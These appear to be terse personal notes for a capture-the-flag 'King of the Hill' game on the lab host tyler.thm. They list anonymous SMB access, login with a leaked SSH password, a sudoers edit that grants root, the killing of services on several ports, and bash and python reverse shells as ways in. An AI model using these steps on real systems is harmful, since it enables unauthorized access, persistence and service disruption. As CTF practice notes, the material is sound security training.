1) smbclient \\\\tyler.thm\\public
	password: {Enter}
2) get flag.txt and alert.txt
3) ssh narrator@tyler.thm
	password:    > from alert.txt 
4) [PassProtect]
5) vim /etc/sudoers
	-> add narrator to admin
6) sudo -i
7) [SSHProtect]
8) [PassProtect]
9) [SUIDProtect] - /usr/bin/vim
10) ssh Connect to root
11) remove narrator from sudoers
12) sudo lsof -t -i tcp:5000 | sudo xargs kill -> kill 5000,3306,445,8080
13) Be King ; get Flags

#----------Ways--------
1) login ssh with alert.txt password
2) running bash reverse-shell on tyler.thm/betatest
3) running python reverse-shell on tyler.thm:5000
